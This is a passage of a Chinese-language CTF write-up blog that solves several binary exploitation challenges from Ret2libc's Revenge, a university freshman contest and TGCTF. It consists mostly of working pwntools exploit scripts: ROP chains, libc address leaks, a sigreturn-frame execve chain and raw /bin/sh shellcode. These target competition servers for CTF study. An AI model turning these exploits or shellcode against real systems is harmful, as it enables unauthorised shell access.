pop_rdx_r_ret,<span class="number">0x100</span>,<span class="number">0</span>,</span><br><span class="line">    read_addr,</span><br><span class="line">    pop_rdi_ret,<span class="number">1</span>,</span><br><span class="line">    pop_rdx_r_ret,<span class="number">0x100</span>,<span class="number">0</span>,</span><br><span class="line">    pop_rax_ret,<span class="number">1</span>,</span><br><span class="line">    write_addr,</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Your Choice:\n&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">io.sendafter(<span class="string">&quot;You should tell her your name first&quot;</span>,payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;your name:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(canary) + p64(bss_addr+<span class="number">0x30</span>)+p64(leave_ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Your Choice:\n&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendafter(<span class="string">&quot;what do you want to say to her?&quot;</span>,payload1)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Ret2libc’s-Revenge"><a href="#Ret2libc’s-Revenge" class="headerlink" title="Ret2libc’s Revenge"></a>Ret2libc’s Revenge</h3><p>一题看似简单的libc，实则不简单</p>
<p>checksec</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>漏洞函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">revenge</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v2[<span class="number">528</span>]; <span class="comment">// [rsp+0h] [rbp-220h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+210h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+217h] [rbp-9h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+218h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+21Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !feof(<span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = fgetc(<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v0 = v6++;</span><br><span class="line">    v5 = v0;</span><br><span class="line">    v2[v0] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = v6;</span><br><span class="line">  v2[v6] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>main函数就是简单的用puts输出了一段内容然后调用漏洞函数，漏洞函数逐个字符循环读取键盘输入到v2中存在栈溢出，但是这道题难在没有关键gadget：”pop rdi;ret”导致无法直接构造rop链泄露libc版本，唯一一个pop只有pop rbp可能只能靠这个来传参然后就卡住了</p>
<p>浮现版：</p>
<p>观察发现revenge函数内存在数组溢出，注意缓冲区的设置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输入流设置的无缓冲，输出流设置的全缓冲</p>
<p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/XY.png" alt="1"></p>
<p>程序中并没有fflush函数，想要改变setbuf的参数也比较困难故选择将缓冲区填满使得我们能够用puts泄露出其实际地址来找libc</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&quot;47.94.103.208&quot;</span>,<span class="number">22660</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc1.so&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text,data          :io.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text,data          :io.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :io.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :io.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :io.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(io.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">inf     =  <span class="keyword">lambda</span> s                 :info(<span class="string">f&quot;<span class="subst">&#123;s&#125;</span> ==&gt; 0x<span class="subst">&#123;<span class="built_in">eval</span>(s):x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x404100</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gadget1 = <span class="number">0x0000000000401180</span><span class="comment">#&#x27;&#x27;&#x27;mov rdi, rsi ; ret&#x27;&#x27;&#x27;</span></span><br><span class="line">xor_rsi = <span class="number">0x00000000004010e4</span><span class="comment">#&#x27;&#x27;&#x27;and rsi, 0 ; ret&#x27;&#x27;&#x27;将rsi清零</span></span><br><span class="line">add_rsi_rbp20 = <span class="number">0x00000000004010eb</span><span class="comment">#add rsi, dword ptr [rbp + 0x20] ; ret</span></span><br><span class="line">rbp = <span class="number">0x000000000040117d</span><span class="comment">#&#x27;&#x27;&#x27;pop rbp ; ret&#x27;&#x27;&#x27;</span></span><br><span class="line">ret =<span class="number">0x000000000040101a</span></span><br><span class="line">magic = <span class="number">0x00000000004010eb</span><span class="comment">#add rsi, dword ptr [rbp + 0x20] ; ret</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x218</span>+<span class="string">b&#x27;\x18&#x27;</span>+<span class="string">b&#x27;\x02&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>+<span class="string">b&#x27;\x1d&#x27;</span>+<span class="string">b&#x27;\x02&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>+p64(bss+<span class="number">0x220</span>)+p64(<span class="number">0x401207</span>)</span><br><span class="line">sl(pay)</span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x200</span>-<span class="number">8</span>)+p64(<span class="number">0x404060</span>)+p64(<span class="number">0x404018</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+<span class="string">b&#x27;\x18&#x27;</span>+<span class="string">b&#x27;\x02&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>+<span class="string">b&#x27;\x1d&#x27;</span>+<span class="string">b&#x27;\x02&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>+p64(<span class="number">0x404300</span>-<span class="number">0x20</span>)\</span><br><span class="line">    +p64(xor_rsi)+p64(add_rsi_rbp20)+p64(gadget1)+p64(<span class="number">0x401070</span>)\</span><br><span class="line">        +p64(rbp)+p64(<span class="number">0x4042e0</span>-<span class="number">0x20</span>)+p64(xor_rsi)+p64(add_rsi_rbp20)+p64(gadget1)+p64(xor_rsi)+p64(<span class="number">0x4010a0</span>)+p64(rbp)+p64(bss+<span class="number">0x420</span>)+p64(<span class="number">0x401207</span>)</span><br><span class="line">sl(pay)</span><br><span class="line">rl()</span><br><span class="line">puts = u64(rl()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">inf(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">libc.address = puts - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;directory /home/yxhueimie/Desktop/glibc_source/glibc-2.35/libio\nb *0x401261\nc&#x27;)</span></span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x200</span>-<span class="number">8</span>)+p64(<span class="number">0x404758</span>)+p64(<span class="number">0x404018</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+<span class="string">b&#x27;\x18&#x27;</span>+<span class="string">b&#x27;\x02&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>+<span class="string">b&#x27;\x1d&#x27;</span>+<span class="string">b&#x27;\x02&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>+p64(<span class="number">0x4044f8</span>-<span class="number">0x20</span>)+p64(xor_rsi)+p64(add_rsi_rbp20)+p64(gadget1)+p64(ret)*<span class="number">2</span>+p64(ret)*<span class="number">0x40</span>+p64(system)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">sl(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="商丘师范学院新生赛4-7"><a href="#商丘师范学院新生赛4-7" class="headerlink" title="商丘师范学院新生赛4.7"></a>商丘师范学院新生赛4.7</h2><p>浅红欺醉粉，肯信有江梅</p>
<p>nc连接直接<code>ls``cat</code></p>
<p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/%E5%95%86%E4%B8%981.png" alt="1"></p>
<p>领取你的小猫娘</p>
<p>简单栈溢出</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;challenge.qsnctf.com&#x27;</span>,<span class="number">30010</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system=<span class="number">0x40121B</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>)+p64(system)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="当时只道是寻常"><a href="#当时只道是寻常" class="headerlink" title="当时只道是寻常"></a>当时只道是寻常</h3><p>主要汇编</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401000</span> <span class="number">48</span> <span class="number">83</span> EC <span class="number">08</span>                   sub     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">0000000000401004</span> B8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000401009</span> BF <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     edi, <span class="number">1</span>                          ; fd</span><br><span class="line">.text:<span class="number">000000000040100</span>E <span class="number">48</span> BE <span class="number">00</span> <span class="number">20</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov     rsi, offset msg                 ; buf</span><br><span class="line">.text:<span class="number">0000000000401018</span> BA <span class="number">3</span>A <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     edx, <span class="number">3</span>Ah ; <span class="string">&#x27;:&#x27;</span>                  ; count</span><br><span class="line">.text:<span class="number">000000000040101</span>D <span class="number">0F</span> <span class="number">05</span>                         syscall                                 ; LINUX - sys_write</span><br><span class="line">.text:<span class="number">000000000040101F</span> B8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401024</span> BF <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     edi, <span class="number">0</span>                          ; fd</span><br><span class="line">.text:<span class="number">0000000000401029</span> <span class="number">48</span> <span class="number">89</span> E6                      mov     rsi, rsp                        ; buf</span><br><span class="line">.text:<span class="number">000000000040102</span>C BA <span class="number">00</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>                mov     edx, <span class="number">400</span>h                       ; count</span><br><span class="line">.text:<span class="number">0000000000401031</span> <span class="number">0F</span> <span class="number">05</span>                         syscall                                 ; LINUX - sys_read</span><br><span class="line">.text:<span class="number">0000000000401033</span> BA <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     edx, <span class="number">8</span>                          ; count</span><br><span class="line">.text:<span class="number">0000000000401038</span> B8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">000000000040103</span>D BF <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     edi, <span class="number">1</span>                          ; fd</span><br><span class="line">.text:<span class="number">0000000000401042</span> <span class="number">48</span> <span class="number">89</span> E6                      mov     rsi, rsp                        ; buf</span><br><span class="line">.text:<span class="number">0000000000401045</span> <span class="number">0F</span> <span class="number">05</span>                         syscall                                 ; LINUX - sys_write</span><br><span class="line">.text:<span class="number">0000000000401047</span> <span class="number">5</span>D                            pop     rbp</span><br><span class="line">.text:<span class="number">0000000000401048</span> C3                            retn</span><br></pre></td></tr></table></figure>

<p>伪代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 start()</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 v0; // rax</span><br><span class="line">  signed __int64 v1; // rax</span><br><span class="line">  char v3[8]; // [rsp+0h] [rbp-8h] BYREF</span><br><span class="line"></span><br><span class="line">  v0 = sys_write(1u, &amp;msg, 58uLL);</span><br><span class="line">  v1 = sys_read(0, v3, 0x400uLL);</span><br><span class="line">  return sys_write(1u, v3, 8uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>+asdfghjkZ现场v不那么，。&#x2F;l一开始看到是系统调用read有点蒙，直接用gdb调试</p>
<p>有&#x2F;bin&#x2F;sh存在栈溢出，什么保护都没开但不能直接构造rop链gadget不太够用这里尝试伪造栈帧通过系统调用sys_rt_sigreturn 改变寄存器状态从而系统调用execve(“&#x2F;bin&#x2F;sh,0,0”)</p>
<p>要系统调用execve(“&#x2F;bin&#x2F;sh,0,0”)需要控制以下寄存器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rdi --&gt; /bin/sh地址（题目中给到了）</span><br><span class="line">rsi --&gt; 0</span><br><span class="line">rdx --&gt;0</span><br><span class="line">rax --&gt;3b</span><br></pre></td></tr></table></figure>

<p>故通过伪造信号帧的方式来调整寄存器的值</p>
<p>先利用已有gadget进行系统调用  sys_rt_sigreturn</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(pop_rax)+p64(<span class="number">0xf</span>)+p64(syscall)</span><br></pre></td></tr></table></figure>

<p>因为是系统调用read只在最后有pop rbp ret的操作故栈上前8个字节会弹到rbp中rsp+8，原rbp处变成了返回地址弹到rip中，故只填充8个字节pop_rax会被放到rip中执行</p>
<p>利用pwntool库中的SigreturnFrame函数伪造信号帧并将其转换为字节序列压入栈中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fake = SigreturnFrame()  </span><br><span class="line">fake.rax = <span class="number">0x3b</span></span><br><span class="line">fake.rdi = <span class="number">0x40203A</span></span><br><span class="line">fake.rdx = <span class="number">0</span></span><br><span class="line">fake.rsi = <span class="number">0</span></span><br><span class="line">fake.rsp = <span class="number">0x402044</span></span><br><span class="line">fake.rip = <span class="number">0x401045</span></span><br><span class="line">payload+=<span class="built_in">bytes</span>(fake)</span><br></pre></td></tr></table></figure>

<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#context.terminal=[&#x27;qterminal&#x27;,&#x27;-e&#x27;]</span></span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">&#x27;./pwn01&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">&#x27;challenge.qsnctf.com&#x27;</span>,<span class="number">30956</span>)</span><br><span class="line">pop_rax=<span class="number">0x000000000040104a</span></span><br><span class="line">bin_sh=<span class="number">0x40203a</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(pop_rax)</span><br><span class="line">payload+=p64(<span class="number">0xf</span>)</span><br><span class="line">payload+=p64(<span class="number">0x401045</span>)</span><br><span class="line">fake = SigreturnFrame()  </span><br><span class="line">fake.rax = <span class="number">0x3b</span></span><br><span class="line">fake.rdi = <span class="number">0x40203A</span></span><br><span class="line">fake.rdx = <span class="number">0</span></span><br><span class="line">fake.rsi = <span class="number">0</span></span><br><span class="line">fake.rsp = <span class="number">0x402044</span></span><br><span class="line">fake.rip = <span class="number">0x401045</span></span><br><span class="line">payload+=<span class="built_in">bytes</span>(fake)</span><br><span class="line">+gdb.attach(p)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<p>我觉君非池中物，咫尺蛟龙云雨</p>
<p>虽然保护全开但是用 mprotect函数使得bss段可读写执行故直接写shellcode即可</p>
<p>注意要小于0x30个字节我用了个24字节的</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;challenge.qsnctf.com&#x27;</span>,<span class="number">32618</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b* 0x401031&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印或发送payload</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;window.&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<p>江南无所有，聊赠一枝春</p>
<p>简单ret2text</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn01&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;challenge.qsnctf.com&#x27;</span>,<span class="number">32599</span>)</span><br><span class="line"></span><br><span class="line">gift = <span class="number">0x4011DC</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x40</span>+<span class="number">0x8</span>)+p64(gift)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="TGCTF"><a href="#TGCTF" class="headerlink" title="TGCTF"></a>TGCTF</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>简单的签到题，栈溢出构造rop链泄露libc基地址接着构造<code>system(/bin/sh)</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;node1.tgctf.woooo.tech&#x27;</span>,<span class="number">32243</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=<span class="number">0x401060</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x401176</span> </span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>+<span class="number">8</span>)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">puts=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base=puts-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=libc_base+<span class="number">0x1d8678</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>+<span 